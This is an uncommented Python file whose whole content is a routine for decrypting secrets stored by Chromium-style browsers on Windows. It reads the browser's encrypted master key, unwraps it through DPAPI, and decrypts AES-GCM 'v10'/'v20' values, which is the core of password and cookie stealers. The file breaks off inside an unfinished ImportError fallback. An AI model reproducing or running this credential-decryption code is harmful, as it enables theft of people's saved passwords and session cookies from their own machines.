import os, json, sqlite3, shutil, tempfile, base64, ctypes
from ctypes import wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi(buf):
    bi = DATA_BLOB(len(buf), ctypes.create_string_buffer(buf, len(buf)))
    bo = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
        raise OSError("DPAPI fail")
    out = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return out

def get_key(ls):
    d = json.load(open(ls, encoding="utf-8"))
    enc = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
    return dpapi(enc)

def decrypt(buf, key):
    if buf[:3] in (b"v10", b"v20"):
        from Cryptodome.Cipher import AES
        iv, payload = buf[3:15], buf[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", "replace")
    return dpapi(buf).decode("utf-8", "replace")

# ensure crypto
try:
    from Cryptodome.Cipher import AES
except ImportError:
    import urllib.request, zipfile, io, sys
    url = "https://pypi.org/pypi/pycryptodome/json"
    # use bundled wheel if any - fallback pure fail message
